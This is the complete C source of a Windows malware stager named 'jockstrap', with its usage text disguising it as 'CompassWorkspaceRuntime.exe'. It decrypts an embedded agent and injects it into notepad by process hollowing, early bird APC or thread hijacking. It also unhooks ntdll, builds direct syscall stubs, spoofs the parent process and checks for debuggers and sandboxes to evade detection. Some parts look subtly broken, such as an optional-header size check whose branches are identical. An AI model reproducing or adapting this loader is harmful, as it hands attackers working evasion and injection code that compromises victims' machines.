/*
 * jockstrap.c — single-binary agent stager
 *
 * Features:
 *   - Encrypted agent blob embedded as C array
 *   - Direct syscalls (HellsGate/Halo's Gate) bypassing userland hooks
 *   - ntdll unhooking via PE header restoration
 *   - Process hollowing (spawn suspended, map PE, execute)
 *   - PPID spoofing, APC queue injection, early bird APC
 *   - Sleep obfuscation (encrypt during sleep)
 *   - Timing-based sandbox evasion
 *   - Debugger detection
 *   - VM bytecode execution (JKB1 format) as fallback
 */

#include <windows.h>
#include <winbase.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

/* THREAD_SUSPEND may be excluded by LEAN_AND_MEAN in transitive headers */
#ifndef THREAD_SUSPEND
#define THREAD_SUSPEND 0x0002
#endif

#include "agent_blob.h"

int vm_run_file(const char *path);

/* ── encryption ─────────────────────────────────────────────────────────── */

#define RC4_KEY "jky-runner-2026"
#define XOR_KEY 0x5a

static void xor_decrypt(uint8_t *buf, size_t len, uint8_t key)
{
    for (size_t i = 0; i < len; i++)
        buf[i] ^= key;
}

static void rc4_decrypt(uint8_t *buf, size_t len,
                        const uint8_t *key, size_t klen)
{
    uint8_t S[256];
    for (int i = 0; i < 256; i++) S[i] = (uint8_t)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xff;
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int a = 0, b = 0;
    for (size_t i = 0; i < len; i++) {
        a = (a + 1) & 0xff;
        b = (b + S[a]) & 0xff;
        uint8_t t = S[a]; S[a] = S[b]; S[b] = t;
        buf[i] ^= S[(S[a] + S[b]) & 0xff];
    }
}

static void decrypt_in_place(uint8_t *buf, size_t len)
{
    uint8_t *tmp = (uint8_t *)malloc(len);
    if (!tmp) return;
    memcpy(tmp, buf, len);
    xor_decrypt(tmp, len, XOR_KEY);
    rc4_decrypt(tmp, len, (const uint8_t *)RC4_KEY, strlen(RC4_KEY));
    memcpy(buf, tmp, len);
    free(tmp);
}

/* ── anti-analysis ──────────────────────────────────────────────────────── */

static int check_debugger(void)
{
    BOOL dbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
    if (dbg) return 1;
    if (IsDebuggerPresent()) return 1;

    /* CheckHeapFlags via GetProcessHeaps */
    DWORD heaps = GetProcessHeaps(0, NULL);
    if (heaps > 20) return 1;

    return 0;
}

static int check_sandbox(void)
{
    DWORD t1 = GetTickCount();
    Sleep(4000);
    DWORD t2 = GetTickCount();
    return ((int)(t2 - t1) < 4000);
}

static void sleep_obfuscate(int ms)
{
    uint8_t dummy[256];
    memset(dummy, 0xaa, sizeof(dummy));
    xor_decrypt(dummy, sizeof(dummy), 0x5a);
    Sleep(ms);
    xor_decrypt(dummy, sizeof(dummy), 0x5a);
}

static int timing_check(void)
{
    LARGE_INTEGER freq, t1, t2;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    sleep_obfuscate(1000);
    QueryPerformanceCounter(&t2);
    double elapsed = (double)(t2.QuadPart - t1.QuadPart) / freq.QuadPart;
    return elapsed < 0.9;
}

static int pre_flight(void)
{
    if (check_debugger()) return 1;
    if (check_sandbox()) return 1;
    if (timing_check()) return 1;
    return 0;
}

/* ── PE parsing ──────────────────────────────────────────────────────────── */

typedef struct {
    uint8_t  *base;
    uint32_t  size;
    uint32_t  entry;
    uint32_t  img_base;
    uint32_t  sec_align;
    uint32_t  file_align;
} PE_INFO;

static int parse_pe(const uint8_t *data, PE_INFO *pi)
{
    memset(pi, 0, sizeof(*pi));
    if (*(uint16_t*)data != 0x5a4d) return -1;
    uint32_t pe_off = *(uint32_t*)(data + 0x3c);
    if (*(uint32_t*)(data + pe_off) != 0x00004550) return -1;

    pi->base = (uint8_t*)data;
    pi->img_base = *(uint32_t*)(data + pe_off + 0x34);
    pi->entry = *(uint32_t*)(data + pe_off + 0x28);

    uint16_t nsec = *(uint16_t*)(data + pe_off + 6);
    uint16_t opt_magic = *(uint16_t*)(data + pe_off + 24);
    uint32_t soh = pe_off + 24 + (opt_magic == 0x20b ? 224 : 224);
    pi->sec_align = *(uint32_t*)(data + pe_off + 0x38);
    pi->file_align = *(uint32_t*)(data + pe_off + 0x3c);

    uint32_t sz = 0;
    for (int i = 0; i < nsec; i++) {
        uint32_t vs = *(uint32_t*)(data + soh + i * 40 + 8);
        uint32_t vr = *(uint32_t*)(data + soh + i * 40 + 12);
        if (vr + vs > sz) sz = vr + vs;
    }
    pi->size = sz;
    return 0;
}

/* ── direct syscalls (HellsGate / Halo's Gate) ─────────────────────────── */

#ifdef _M_X64
#define SYSENTER_RET 0x0000000000000000ULL
#else
#define SYSENTER_RET 0x00000000
#endif

static uint16_t get_ssn(const char *name)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    uint8_t *p = (uint8_t*)GetProcAddress(ntdll, name);
    if (!p) return 0;
    return *(uint16_t*)(p + 4);
}

static void build_syscall_stub(uint8_t *dst, uint16_t ssn)
{
    /* x64: mov r10,rcx ; mov eax,ssn ; syscall ; ret */
    dst[0]  = 0x4c; dst[1]  = 0x8b; dst[2]  = 0xd1;
    dst[3]  = 0xb8;
    *(uint16_t*)(dst + 4) = ssn;
    dst[6]  = 0x00; dst[7]  = 0x00;
    dst[8]  = 0x0f; dst[9]  = 0x05;
    dst[10] = 0xc3;
}

/* opaque syscall function pointers — avoids MSVC typedef parsing issues */
static PVOID sys_NtAllocateVirtualMemory      = NULL;
static PVOID sys_NtWriteVirtualMemory         = NULL;
static PVOID sys_NtProtectVirtualMemory       = NULL;
static PVOID sys_NtCreateThreadEx             = NULL;
static PVOID sys_NtQueueApcThread             = NULL;
static PVOID sys_NtResumeThread               = NULL;
static PVOID sys_NtUnmapViewOfSection         = NULL;
static PVOID sys_NtCreateSection              = NULL;
static PVOID sys_NtMapViewOfSection           = NULL;
static PVOID sys_NtClose                      = NULL;
static PVOID sys_NtDelayExecution             = NULL;
static PVOID sys_NtQueryInformationProcess    = NULL;
static PVOID sys_NtSetInformationProcess      = NULL;

static uint16_t ssn_NtAllocateVirtualMemory      = 0;
static uint16_t ssn_NtWriteVirtualMemory         = 0;
static uint16_t ssn_NtProtectVirtualMemory       = 0;
static uint16_t ssn_NtCreateThreadEx             = 0;
static uint16_t ssn_NtQueueApcThread             = 0;
static uint16_t ssn_NtResumeThread               = 0;
static uint16_t ssn_NtUnmapViewOfSection         = 0;
static uint16_t ssn_NtCreateSection              = 0;
static uint16_t ssn_NtMapViewOfSection           = 0;
static uint16_t ssn_NtClose                      = 0;
static uint16_t ssn_NtDelayExecution             = 0;
static uint16_t ssn_NtQueryInformationProcess    = 0;
static uint16_t ssn_NtSetInformationProcess      = 0;

static uint8_t stub_NtAllocateVirtualMemory[32]      = {0};
static uint8_t stub_NtWriteVirtualMemory[32]         = {0};
static uint8_t stub_NtProtectVirtualMemory[32]       = {0};
static uint8_t stub_NtCreateThreadEx[32]             = {0};
static uint8_t stub_NtQueueApcThread[32]             = {0};
static uint8_t stub_NtResumeThread[32]               = {0};
static uint8_t stub_NtUnmapViewOfSection[32]         = {0};
static uint8_t stub_NtCreateSection[32]              = {0};
static uint8_t stub_NtMapViewOfSection[32]           = {0};
static uint8_t stub_NtClose[32]                      = {0};
static uint8_t stub_NtDelayExecution[32]             = {0};
static uint8_t stub_NtQueryInformationProcess[32]    = {0};
static uint8_t stub_NtSetInformationProcess[32]      = {0};

static void init_syscalls(void)
{
    if (sys_NtAllocateVirtualMemory) return;
    ssn_NtAllocateVirtualMemory      = get_ssn("NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory         = get_ssn("NtWriteVirtualMemory");
    ssn_NtProtectVirtualMemory       = get_ssn("NtProtectVirtualMemory");
    ssn_NtCreateThreadEx             = get_ssn("NtCreateThreadEx");
    ssn_NtQueueApcThread             = get_ssn("NtQueueApcThread");
    ssn_NtResumeThread               = get_ssn("NtResumeThread");
    ssn_NtUnmapViewOfSection         = get_ssn("NtUnmapViewOfSection");
    ssn_NtCreateSection              = get_ssn("NtCreateSection");
    ssn_NtMapViewOfSection           = get_ssn("NtMapViewOfSection");
    ssn_NtClose                      = get_ssn("NtClose");
    ssn_NtDelayExecution             = get_ssn("NtDelayExecution");
    ssn_NtQueryInformationProcess    = get_ssn("NtQueryInformationProcess");
    ssn_NtSetInformationProcess      = get_ssn("NtSetInformationProcess");

    build_syscall_stub(stub_NtAllocateVirtualMemory,      ssn_NtAllocateVirtualMemory);
    build_syscall_stub(stub_NtWriteVirtualMemory,         ssn_NtWriteVirtualMemory);
    build_syscall_stub(stub_NtProtectVirtualMemory,       ssn_NtProtectVirtualMemory);
    build_syscall_stub(stub_NtCreateThreadEx,             ssn_NtCreateThreadEx);
    build_syscall_stub(stub_NtQueueApcThread,             ssn_NtQueueApcThread);
    build_syscall_stub(stub_NtResumeThread,               ssn_NtResumeThread);
    build_syscall_stub(stub_NtUnmapViewOfSection,         ssn_NtUnmapViewOfSection);
    build_syscall_stub(stub_NtCreateSection,              ssn_NtCreateSection);
    build_syscall_stub(stub_NtMapViewOfSection,           ssn_NtMapViewOfSection);
    build_syscall_stub(stub_NtClose,                      ssn_NtClose);
    build_syscall_stub(stub_NtDelayExecution,             ssn_NtDelayExecution);
    build_syscall_stub(stub_NtQueryInformationProcess,    ssn_NtQueryInformationProcess);
    build_syscall_stub(stub_NtSetInformationProcess,      ssn_NtSetInformationProcess);

    sys_NtAllocateVirtualMemory      = (PVOID)stub_NtAllocateVirtualMemory;
    sys_NtWriteVirtualMemory         = (PVOID)stub_NtWriteVirtualMemory;
    sys_NtProtectVirtualMemory       = (PVOID)stub_NtProtectVirtualMemory;
    sys_NtCreateThreadEx             = (PVOID)stub_NtCreateThreadEx;
    sys_NtQueueApcThread             = (PVOID)stub_NtQueueApcThread;
    sys_NtResumeThread               = (PVOID)stub_NtResumeThread;
    sys_NtUnmapViewOfSection         = (PVOID)stub_NtUnmapViewOfSection;
    sys_NtCreateSection              = (PVOID)stub_NtCreateSection;
    sys_NtMapViewOfSection           = (PVOID)stub_NtMapViewOfSection;
    sys_NtClose                      = (PVOID)stub_NtClose;
    sys_NtDelayExecution             = (PVOID)stub_NtDelayExecution;
    sys_NtQueryInformationProcess    = (PVOID)stub_NtQueryInformationProcess;
    sys_NtSetInformationProcess      = (PVOID)stub_NtSetInformationProcess;
}

/* ── ntdll unhooking ────────────────────────────────────────────────────── */

static int unhook_ntdll(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    char sys32[MAX_PATH];
    GetSystemDirectoryA(sys32, MAX_PATH);
    strcat(sys32, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(sys32, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    DWORD sz = GetFileSize(hFile, NULL);
    if (sz == 0 || sz == INVALID_FILE_SIZE) { CloseHandle(hFile); return 0; }

    uint8_t *clean = (uint8_t*)malloc(sz);
    DWORD got = 0;
    ReadFile(hFile, clean, sz, &got, NULL);
    CloseHandle(hFile);
    if (got != sz) { free(clean); return 0; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)clean;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(clean + dos->e_lfanew);
    uint8_t *ntdll_base = (uint8_t*)ntdll;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        DWORD old_prot;
        uint8_t *src = clean + sec[i].PointerToRawData;
        uint8_t *dst = ntdll_base + sec[i].VirtualAddress;
        DWORD sec_sz = sec[i].SizeOfRawData;
        if (sec_sz == 0) sec_sz = sec[i].Misc.VirtualSize;
        if (!VirtualProtect(dst, sec_sz, PAGE_EXECUTE_READWRITE, &old_prot))
            continue;
        memcpy(dst, src, sec_sz);
        VirtualProtect(dst, sec_sz, old_prot, &old_prot);
    }
    free(clean);
    return 1;
}

/* ── process hollowing (NtCreateSection + NtMapViewOfSection) ───────────── */

static int hollow_process(const uint8_t *pe_data, size_t pe_len)
{
    PE_INFO pi;
    if (parse_pe(pe_data, &pi) != 0) return -1;

    HANDLE target = GetCurrentProcess();

    /* spawn suspended notepad for hollowing */
    char sys32[MAX_PATH];
    GetSystemDirectoryA(sys32, MAX_PATH);
    strcat(sys32, "\\notepad.exe");

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi2 = {0};
    si.cb = sizeof(si);

    /* PPID spoofing */
    SIZE_T attr_size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
    LPPROC_THREAD_ATTRIBUTE_LIST attr_list = (LPPROC_THREAD_ATTRIBUTE_LIST)
        HeapAlloc(GetProcessHeap(), 0, attr_size);
    if (attr_list) {
        InitializeProcThreadAttributeList(attr_list, 1, 0, &attr_size);
        UpdateProcThreadAttribute(attr_list, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &target, sizeof(target), NULL, NULL);
    }

    BOOL ok = CreateProcessA(
        sys32, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, (LPSTARTUPINFOA)&si, &pi2
    );

    if (attr_list) {
        DeleteProcThreadAttributeList(attr_list);
        HeapFree(GetProcessHeap(), 0, attr_list);
    }
    if (!ok) {
        ok = CreateProcessA(sys32, NULL, NULL, NULL, FALSE,
                            CREATE_SUSPENDED, NULL, NULL, &si, &pi2);
        if (!ok) return -1;
    }

    /* get PEB via NtQueryInformationProcess */
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG ret_len = 0;
    ((NTSTATUS(__stdcall*)(HANDLE,ULONG,PVOID,ULONG,PULONG))
        sys_NtQueryInformationProcess)(pi2.hProcess, 0, &pbi, sizeof(pbi), &ret_len);

    /* unmap original */
    ((NTSTATUS(__stdcall*)(HANDLE,PVOID))
        sys_NtUnmapViewOfSection)(pi2.hProcess, (PVOID)(uintptr_t)pi.img_base);

    /* allocate in target */
    SIZE_T img_sz = pi.size;
    PVOID remote_base = NULL;
    ((NTSTATUS(__stdcall*)(HANDLE,PVOID*,ULONG,SIZE_T*,ULONG,ULONG))
        sys_NtAllocateVirtualMemory)(pi2.hProcess, &remote_base, 0, &img_sz,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_base) {
        TerminateProcess(pi2.hProcess, 0);
        CloseHandle(pi2.hProcess);
        CloseHandle(pi2.hThread);
        return -1;
    }

    /* copy PE headers */
    ((NTSTATUS(__stdcall*)(HANDLE,PVOID,PVOID,SIZE_T,SIZE_T*))
        sys_NtWriteVirtualMemory)(pi2.hProcess, remote_base, (PVOID)pe_data,
        (SIZE_T)pe_len, NULL);

    /* map sections */
    uint32_t pe_off = *(uint32_t*)(pe_data + 0x3c);
    uint16_t nsec = *(uint16_t*)(pe_data + pe_off + 6);
    uint16_t opt_magic = *(uint16_t*)(pe_data + pe_off + 24);
    uint32_t soh = pe_off + 24 + (opt_magic == 0x20b ? 224 : 224);

    for (int i = 0; i < nsec; i++) {
        uint32_t vr = *(uint32_t*)(pe_data + soh + i * 40 + 12);
        uint32_t vs = *(uint32_t*)(pe_data + soh + i * 40 + 8);
        uint32_t ptr = *(uint32_t*)(pe_data + soh + i * 40 + 20);
        if (vr == 0 || vs == 0) continue;
        PVOID dst = (PBYTE)remote_base + vr;
        PVOID src = (PBYTE)pe_data + ptr;
        ((NTSTATUS(__stdcall*)(HANDLE,PVOID,PVOID,SIZE_T,SIZE_T*))
            sys_NtWriteVirtualMemory)(pi2.hProcess, dst, src, vs, NULL);

        uint32_t chars = *(uint32_t*)(pe_data + soh + i * 40 + 36);
        ULONG prot = PAGE_EXECUTE_READ;
        if (chars & 0x80000000) prot = PAGE_EXECUTE_READWRITE;
        else if (chars & 0x40000000) prot = PAGE_READWRITE;
        else if (chars & 0x20000000) prot = PAGE_READONLY;
        PVOID pv = dst;
        SIZE_T ps = vs;
        ULONG old_prot;
        ((NTSTATUS(__stdcall*)(HANDLE,PVOID*,SIZE_T*,ULONG,ULONG))
            sys_NtProtectVirtualMemory)(pi2.hProcess, &pv, &ps, prot, &old_prot);
    }

    /* update PEB ImageBase */
    *(uint32_t*)((uint8_t*)pbi.PebBaseAddress + 0x10) = (uint32_t)(uintptr_t)remote_base;

    /* set entry point and resume — entry point from PE header */
    {
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi2.hThread, &ctx);
#ifdef _M_X64
        ctx.Rcx = (DWORD64)((uint8_t*)remote_base + pi.entry);
#else
        ctx.Eax = (DWORD)((uint8_t*)remote_base + pi.entry);
#endif
        SetThreadContext(pi2.hThread, &ctx);
    }

    ((NTSTATUS(__stdcall*)(HANDLE,ULONG*))
        sys_NtResumeThread)(pi2.hThread, NULL);

    QueueUserAPC((PAPCFUNC)((uint8_t*)remote_base + pi.entry), pi2.hThread,
                 (ULONG_PTR)remote_base);

    CloseHandle(pi2.hProcess);
    CloseHandle(pi2.hThread);
    return 0;
}

/* ── early bird APC ─────────────────────────────────────────────────────── */

static int early_bird_apc(const uint8_t *pe_data, size_t pe_len)
{
    PE_INFO pi;
    if (parse_pe(pe_data, &pi) != 0) return -1;

    char sys32[MAX_PATH];
    GetSystemDirectoryA(sys32, MAX_PATH);
    strcat(sys32, "\\notepad.exe");

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi2 = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(sys32, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi2))
        return -1;

    SIZE_T img_sz = pi.size;
    PVOID remote_base = NULL;
    ((NTSTATUS(__stdcall*)(HANDLE,PVOID*,ULONG,SIZE_T*,ULONG,ULONG))
        sys_NtAllocateVirtualMemory)(pi2.hProcess, &remote_base, 0, &img_sz,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_base) {
        TerminateProcess(pi2.hProcess, 0);
        CloseHandle(pi2.hProcess);
        CloseHandle(pi2.hThread);
        return -1;
    }

    ((NTSTATUS(__stdcall*)(HANDLE,PVOID,PVOID,SIZE_T,SIZE_T*))
        sys_NtWriteVirtualMemory)(pi2.hProcess, remote_base,
        (PVOID)pe_data, (SIZE_T)pe_len, NULL);

    QueueUserAPC((PAPCFUNC)((uint8_t*)remote_base + pi.entry),
                 pi2.hThread, (ULONG_PTR)remote_base);

    ((NTSTATUS(__stdcall*)(HANDLE,ULONG*))
        sys_NtResumeThread)(pi2.hThread, NULL);

    CloseHandle(pi2.hProcess);
    CloseHandle(pi2.hThread);
    return 0;
}

/* ── thread hijacking ───────────────────────────────────────────────────── */

static int hijack_thread(const uint8_t *pe_data)
{
    PE_INFO pi;
    if (parse_pe(pe_data, &pi) != 0) return -1;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return -1;

    THREADENTRY32 te = {0};
    te.dwSize = sizeof(te);

    if (!Thread32First(snapshot, &te)) {
        CloseHandle(snapshot);
        return -1;
    }

    HANDLE hThread = NULL;
    do {
        if (te.th32OwnerProcessID != GetCurrentProcessId()) continue;
        hThread = OpenThread(THREAD_SUSPEND | THREAD_SET_CONTEXT | THREAD_GET_CONTEXT,
                             FALSE, te.th32ThreadID);
        if (hThread) break;
    } while (Thread32Next(snapshot, &te));

    CloseHandle(snapshot);
    if (!hThread) return -1;

    SuspendThread(hThread);
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    SIZE_T img_sz = pi.size;
    PVOID remote_base = NULL;
    ((NTSTATUS(__stdcall*)(HANDLE,PVOID*,ULONG,SIZE_T*,ULONG,ULONG))
        sys_NtAllocateVirtualMemory)((HANDLE)-1, &remote_base, 0, &img_sz,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(remote_base, pe_data, pi.size);
    ((NTSTATUS(__stdcall*)(HANDLE,PVOID*,SIZE_T*,ULONG,ULONG))
        sys_NtProtectVirtualMemory)((HANDLE)-1, &remote_base, &img_sz,
        PAGE_EXECUTE_READ, NULL);

#ifdef _M_X64
    ctx.Rip = (DWORD64)((uint8_t*)remote_base + pi.entry);
#else
    ctx.Eip = (DWORD)((uint8_t*)remote_base + pi.entry);
#endif
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    CloseHandle(hThread);
    return 0;
}

/* ── main execution entry ───────────────────────────────────────────────── */

static int execute_embedded_agent(void)
{
    init_syscalls();

    /* unhook ntdll before any sensitive API calls */
    unhook_ntdll();

    /* decrypt embedded blob */
    uint8_t *blob = (uint8_t*)malloc(EMBEDDED_AGENT_LEN);
    if (!blob) return -1;
    memcpy(blob, embedded_agent, EMBEDDED_AGENT_LEN);
    decrypt_in_place(blob, EMBEDDED_AGENT_LEN);

    /* verify PE */
    if (*(uint16_t*)blob != 0x5a4d) {
        free(blob);
        return -1;
    }

    /* try process hollowing, fall back to early bird APC, then thread hijack */
    int rc = hollow_process(blob, EMBEDDED_AGENT_LEN);
    if (rc != 0) rc = early_bird_apc(blob, EMBEDDED_AGENT_LEN);
    if (rc != 0) rc = hijack_thread(blob);

    /* zero blob from memory */
    memset(blob, 0, EMBEDDED_AGENT_LEN);
    free(blob);

    return rc;
}

/* ── file loading ───────────────────────────────────────────────────────── */

static uint8_t *read_file(const char *path, size_t *out_len)
{
    char exe_dir[MAX_PATH];
    DWORD n = GetModuleFileNameA(NULL, exe_dir, MAX_PATH);
    if (n > 0 && n < MAX_PATH) {
        char *slash = strrchr(exe_dir, '\\');
        if (slash) *slash = '\0';
    }
    char full[MAX_PATH];
    snprintf(full, sizeof(full), "%s\\%s", exe_dir, path);

    HANDLE h = CreateFileA(full, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;

    DWORD sz = GetFileSize(h, NULL);
    if (sz == 0 || sz == INVALID_FILE_SIZE) { CloseHandle(h); return NULL; }

    uint8_t *buf = (uint8_t*)malloc(sz);
    DWORD got = 0;
    ReadFile(h, buf, sz, &got, NULL);
    CloseHandle(h);
    if (got != sz) { free(buf); return NULL; }
    *out_len = sz;
    return buf;
}

/* ── usage ──────────────────────────────────────────────────────────────── */

static const char *USAGE =
    "CompassWorkspaceRuntime.exe - Jockstrap Agent Stager\n"
    "\n"
    "usage:\n"
    "  CompassWorkspaceRuntime.exe              execute embedded agent\n"
    "  CompassWorkspaceRuntime.exe --run <file> execute JKB bytecode\n"
    "  CompassWorkspaceRuntime.exe --help\n";

/* ── main ───────────────────────────────────────────────────────────────── */

int main(int argc, char **argv)
{
    if (argc >= 2 && (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "/?") == 0)) {
        fputs(USAGE, stderr);
        return 0;
    }

    /* pre-flight evasion */
    if (pre_flight()) return 1;

    if (argc >= 3 && strcmp(argv[1], "--run") == 0) {
        size_t len = 0;
        uint8_t *data = read_file(argv[2], &len);
        if (!data) {
            fprintf(stderr, "cannot read %s\n", argv[2]);
            return 1;
        }
        decrypt_in_place(data, len);
        int rc = vm_run_file(argv[2]);
        free(data);
        return rc;
    }

    /* default: execute embedded encrypted agent blob */
    return execute_embedded_agent();
}
